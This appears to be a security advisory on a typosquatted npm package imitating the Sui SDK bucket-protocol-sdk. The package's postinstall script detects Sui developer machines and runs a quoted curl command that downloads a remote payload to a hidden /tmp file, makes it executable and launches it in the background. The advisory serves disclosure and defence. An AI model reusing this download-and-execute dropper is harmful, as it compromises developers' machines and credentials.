summary: Typosquat of bucket-protocol-sdk with postinstall dropper targeting Sui developers
details: The package advertises itself as a 'community maintained drop-in replacement' for the legitimate Sui DeFi SDK bucket-protocol-sdk, but ships no functionality — src/bucket.ts and sibling files contain only `export {};` stubs. The package.json declares `"postinstall": "node install.js"`, and install.js detects a Sui developer environment by checking for the `sui` binary on PATH and `~/.sui/sui_config/client.yaml`, then runs `curl -s -L -o /tmp/.sui-helper <implantUrl> && chmod +x /tmp/.sui-helper && /tmp/.sui-helper &` to drop and background-execute a remote payload. The implantUrl literal is currently an empty string with the inline comment `// <--- PUT YOUR ACTUAL 0x0.st URL HERE` — an unfinished attacker template referencing the anonymous file host 0x0.st. The dropper machinery (Sui-developer gating, hidden /tmp dotfile staging, chmod+x, background launch) is fully wired; only the payload URL is blank in this published version. Any installer running `npm install bucket-protocol-sdk-v2` on a Sui developer machine is the intended victim. Author and keywords fields are empty, consistent with throwaway-publisher disposable infrastructure.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
